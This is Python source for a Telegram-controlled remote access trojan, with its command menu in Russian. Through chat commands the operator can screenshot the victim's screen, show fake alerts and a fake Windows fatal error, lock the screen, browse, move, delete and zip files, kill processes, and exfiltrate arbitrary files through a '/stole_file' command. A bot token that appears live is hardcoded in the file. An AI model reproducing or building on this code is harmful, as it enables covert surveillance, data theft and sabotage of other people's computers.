import os
import threading
import time as timer

import telebot

from modules import get_argw, screenshot, screen_size, volume, browser_funcs, gui_elements, show_windows, locker, \
    play_sound, spiders, taskill, say_text
from modules.file_system_modules import get_paths, get_folders, get_files, file_commands

token = "5129940803:AAGklFmHwceNGqrihAUZVCSGxIeYd2E72ck"
command_list = "Список команд:\n" \
               "    1) /get_size - Размер экрана\n" \
               "    2) /get_screen - Скриншот\n" \
               "    3) /set_max_volume - Установить максимальную громкость\n" \
               "    4) /set_min_volume - Установить минимальную громкость\n" \
               "    5) /open_url (URL) - Открыть ссылку\n" \
               "    6) /mb_alert (title; text) - Оповещение\n" \
               "    7) /mb_entry_alert (title; text) - Вопрос с текстовым ответом\n" \
               "    8) /mb_yn_question (title; text) - Вопрос с ответом да или нет\n" \
               "    9) /windows_fatal_error - Имитация ошибки системы\n" \
               "    10) /text_window (title; size; bg_color; font_color; text) - Текстовое окно\n" \
               "    11) /show_image - Показать картинку\n" \
               "    12) /lock_screen - Заблокировать экран\n" \
               "    13) /play_sound - Проиграть трек mp4\n" \
               "    14) /say_text - Произнести текст\n" \
               "Работа с файловой системой\n" \
               "    14) /get_paths (path) - Показать все файлы/папки по пути path\n" \
               "    15) /show_folders (path) - Показать папки по пути path\n" \
               "    16) /show_files (path) - Показать файлы каталога path\n" \
               "    17) /move_file (path1; path2) - Скопировать файл из папки path1 в path2\n" \
               "    18) /rename_file (path1; path2) - Переместить файл из папки path1 в path2\n" \
               "    19) /delete_file (path) - Удалить файл\n" \
               "    20) /make_zip (path) - Сделать zip папку\n" \
               "    21) /stole_file (path) - Украсть файл\n" \
               "Фановые функции\n" \
               "    22) /show_spiders - Показать пауков\n" \
               "    23) /all_tasks - Показать запущенные процессы\n" \
               "    24) /kill_task (process_name) - Кикнуть процесс"

bot = telebot.TeleBot(token)


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, command_list)


@bot.message_handler(commands=['get_size'])
def get_size(message):
    bot.send_message(message.chat.id, screen_size.size())


@bot.message_handler(commands=['get_screen'])
def get_screen(message):
    try:
        bot.send_photo(message.chat.id, screenshot.make_screen())
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['set_max_volume'])
def set_max_volume(message):
    try:
        volume.set_max()
        bot.send_message(message.chat.id, "Громкость была установленна 100%")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['set_min_volume'])
def set_min_volume(message):
    try:
        volume.set_min()
        bot.send_message(message.chat.id, "Громкость была установленна 0%")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['open_url'])
def open_url(message):
    try:
        try:
            url = get_argw.get_args(message.text)[0]
            browser_funcs.open_url(url)
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['mb_alert'])
def simple_alert(message):
    try:
        title, text = get_argw.get_args(message.text)[0].strip(), get_argw.get_args(message.text)[1].strip()
        bot.send_message(message.chat.id, f"Оповещение [{title}, {text}] было показана")
        gui_elements.MbAlert(title, text)
        bot.send_message(message.chat.id, f"Оповещение [{title}, {text}] было скрыта пользователем")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['mb_entry_alert'])
def entry_alert(message):
    try:
        title, text = get_argw.get_args(message.text)[0].strip(), get_argw.get_args(message.text)[1].strip()
        bot.send_message(message.chat.id, f"Оповещение [{title}, {text}] было показана")
        answer = gui_elements.MbTextQuestion(title, text)
        bot.send_message(message.chat.id, f"Пользователь ответил: {answer}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['mb_yn_question'])
def mb_yn_question(message):
    try:
        title, text = get_argw.get_args(message.text)[0].strip(), get_argw.get_args(message.text)[
            1].strip()
        bot.send_message(message.chat.id, f"Текстовый вопрос [{title}, {text}] был задан")
        value = gui_elements.MbQuestion(title, text)
        bot.send_message(message.chat.id, f"Пользователь ответил [{value}]")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['windows_fatal_error'])
def windows_fatal_error(message):
    try:
        bot.send_message(message.chat.id, "Ошибка была показана")
        gui_elements.Error0xC000021A()
        bot.send_message(message.chat.id, "Ошибка была скрыта пользователем")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['text_window'])
def text_window(message):
    try:
        title = get_argw.get_args(message.text)[0].strip()
        geometry = get_argw.get_args(message.text)[1].strip()
        bg_color = get_argw.get_args(message.text)[2].strip()
        fg_color = get_argw.get_args(message.text)[3].strip()
        label_text = get_argw.get_args(message.text)[4]
        bot.send_message(message.chat.id, f"Окно [{title}, {geometry}, {label_text}] было показано")
        lable_window = show_windows.ShowWindow()
        threading.Thread(target=lable_window.draw(title, geometry, bg_color, fg_color, label_text)).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_image'])
def show_image(message):
    global show_image_switch
    show_image_switch = True
    bot.send_message(message.chat.id, "Отправте картинку боту которую нужно показать")


@bot.message_handler(content_types=['photo'])
def download_image(message):
    global show_image_switch, hide_image_switch, save_file, path_to_save, photo_image_window
    try:
        if show_image_switch:
            bot.send_message(message.chat.id, "Картинка была показана")
            fileID = message.photo[-1].file_id
            file_info = bot.get_file(fileID)
            downloaded_file = bot.download_file(file_info.file_path)

            with open("image.jpg", "wb") as file:
                file.write(downloaded_file)
                file.close()
            show_image_switch = False
            threading.Thread(target=show_windows.ShowImage().show()).start()
    except Exception as e:
        show_image_switch = False
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['lock_screen'])
def lock_screen(message):
    try:
        bot.send_message(message.chat.id, "Экран заблокирован, для разблокировки используйте /unlock_screen")
        threading.Thread(target=lambda: lock(message)).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


def lock(message):
    try:
        global locker_v
        locker_v = locker.Locker()
        locker_v.draw(get_argw.get_args(message.text[0]))
    except Exception as e:
        bot.send_message(message.chat.id, f"При повторной блокировке возникла ошибка {e}")


@bot.message_handler(commands=['unlock_screen'])
def unlock_screen(message):
    global locker_v
    try:
        locker_v.exit("event")
        locker_v = None
        bot.send_message(message.chat.id, "Экран был разблокирован")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['play_sound'])
def play_sound_command(message):
    global play_sound_swich
    play_sound_swich = True
    bot.send_message(message.chat.id, "Отправте звук боту который нужно воспроизвести")


@bot.message_handler(content_types=['audio'])
def mp3(message):
    try:
        global play_sound_swich
        fileID = message.audio.file_id
        file = bot.get_file(fileID)
        download = bot.download_file(file.file_path)
        title = message.audio.title
        perfor = message.audio.performer
        with open('sound.mp3', 'wb') as f:
            f.write(download)
            f.close()
        play_sound.play_voice()
        play_sound_swich = False
        os.remove("sound.mp3")
    except Exception as e:
        bot.send_message(message.chat.id, f"Try send another file. Error: {e}")


@bot.message_handler(commands=['say_text'])
def say_text_handler(message):
    try:
        say_text.play(get_argw.get_args(message.text)[0])
        bot.send_message(message.chat.id, f'Текст: "{get_argw.get_args(message.text)[0]}" был сказан')
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['get_paths'])
def get_paths_from_root(message):
    try:
        path = get_argw.get_args(message.text)
        bot.send_message(message.chat.id,
                         "Перепись фалов начата, запросите их командой /get_paths_from_temp через некоторое время")
        threading.Thread(target=lambda: get_paths.write_paths_to_file(path[0])).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['get_paths_from_temp'])
def get_paths_from_temp(message):
    try:
        finished = False
        with open("finished.txt", "r") as file:
            if file.read() == "true":
                finished = True
        if finished:
            with open("paths.txt", "r") as file:
                bot.send_document(message.chat.id, file)
                file.close()

            os.remove("paths.txt")
            os.remove("finished.txt")
        else:
            bot.send_message(message.chat.id, "Пути пока не готовы, повторите через некоторое время")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_folders'])
def show_folders(message):
    try:
        path = get_argw.get_args(message.text)[0]
        dirs = get_folders.get_folders(path)
        output = ""
        for element in dirs:
            output += element.replace(path, "") + "\n"
        bot.send_message(message.chat.id, f"Папки: \n {output}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_files'])
def show_files(message):
    try:
        path = get_argw.get_args(message.text)[0]
        files = get_files.get_filenames(path)
        output = ""

        for element in files:
            output += element.replace(path, "") + "\n"
        bot.send_message(message.chat.id, f"Файлы: \n {output}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['move_file'])
def clone_file(message):
    try:
        path1 = get_argw.get_args(message.text)[0]
        path2 = get_argw.get_args(message.text)[1]
        bot.send_message(message.chat.id, "Файл был перемещён")
        file_commands.move(path1, path2)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['rename_file'])
def rename_file(message):
    try:
        path = get_argw.get_args(message.text)[0]
        new_name = get_argw.get_args(message.text)[1]
        file_commands.rename(path, new_name)
        bot.send_message(message.chat.id, "Файл был переимён")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['delete_file'])
def delete_file(message):
    try:
        path = get_argw.get_args(message.text)[0]
        file_commands.remove(path)
        bot.send_message(message.chat.id, "Файл был удалён")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['make_zip'])
def make_zip(message):
    try:
        path = get_argw.get_args(message.text)[0]
        filename = path[path.rfind("\\"):]
        threading.Thread(target=lambda: file_commands.make_zip(path)).start()
        dirpath = os.path.abspath(os.curdir) + "\\" + f'ZipFiles\\{filename}'

        bot.send_message(message.chat.id,
                         f"Файл был сохранён по пути: {dirpath}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['stole_file'])
def stole_file(message):
    try:
        path = get_argw.get_args(message.text)[0]
        with open(path, "rb") as file:
            bot.send_document(message.chat.id, file)
            file.close()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['show_spiders'])
def show_spiders(message):
    global spider_window
    try:
        bot.send_message(message.chat.id, "Hide spiders with command /hide_spiders")
        spider_window = spiders.Window()
        threading.Thread(target=spider_window.draw()).start()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['hide_spiders'])
def hide_spiders(message):
    global spider_window
    try:
        spider_window.close()
        spider_window = 0
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['all_tasks'])
def all_tasks(message):
    try:
        with open("all_tasks.txt", "w") as file:
            file.write(taskill.show_tasks())
            file.close()
        with open("all_tasks.txt", "r") as file:
            bot.send_document(message.chat.id, file)
            file.close()
        os.remove("all_tasks.txt")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['kill_task'])
def kill_task(message):
    try:
        process_name = get_argw.get_args(message.text)[0]
        taskill.task_kill(process_name)
        bot.send_message(message.chat.id, f"Процесс был завершён")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


try:
    while True:
        bot.infinity_polling()
        timer.sleep(120)
except:
    pass
